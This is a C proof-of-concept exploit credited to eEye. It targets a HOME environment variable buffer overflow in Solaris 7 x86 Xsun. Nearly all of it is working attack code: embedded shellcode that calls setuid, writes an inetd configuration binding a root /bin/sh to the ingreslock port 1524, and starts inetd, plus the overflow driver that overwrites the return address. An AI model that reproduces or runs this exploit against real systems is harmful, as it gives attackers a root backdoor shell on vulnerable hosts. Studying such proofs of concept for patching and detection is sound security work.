/***********************************/
Solaris 7 (x86) /usr/openwin/bin/Xsun
HOME environment overflow

Proof of Concept Exploitation
riley@eeye.com

Puts a Root shell on local port 1524
/***********************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUFLEN  1041

/* seteuid/setuid/inetd shell */
char eyecode[] =
"\xeb\x51\x9a\x65\x65\x79\x65\x07\x90\xc3\x5e"
"\x29\xc0\x89\x46\xab\x88\x46\xb0\x89\x46\x0c"
"\x50\xb0\x8d\xe8\xe4\xff\xff\xff\x29\xc0\x50"
"\xb0\x17\xe8\xda\xff\xff\xff\x29\xc0\x88\x46"
"\x17\x88\x46\x1a\x88\x46\x78\x29\xc0\x50\x56"
"\x8d\x5e\x10\x89\x1e\x53\x8d\x5e\x18\x89\x5e"
"\x04\x8d\x5e\x1b\x89\x5e\x08\xb0\x3b\xe8\xb2"
"\xff\xff\xff\x90\x90\xc3\xe8\xb2\xff\xff\xff"
"\x90\x6b\x61\x6d\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x2f\x62\x69\x6e\x2f\x73"
"\x68\x20\x2d\x63\x20"
"echo \"ingreslock stream tcp nowait root /bin/sh sh -i\">/tmp/eeye;"
"/usr/sbin/inetd -s /tmp/eeye2001";

char buf[BUFLEN];
unsigned long int nop, esp;
long int offset = 0;

unsigned long int get_esp()
{__asm__("movl %esp,%eax");}

int main (int argc, char *argv[])
{
	int i;
	if (argc > 1)
		offset = strtol(argv[1], NULL, 0);
	else
		offset = -200;
	esp = get_esp();
	memset(buf, 0x90, BUFLEN);
	memcpy(buf+800, eyecode, strlen(eyecode));
	*((int *) &buf[1037]) = esp+offset;
	strncpy(&buf[0],"HOME=",5);
	putenv(buf);
	execl("/usr/openwin/bin/Xsun", "eEye", ":1",NULL);
	return;
}
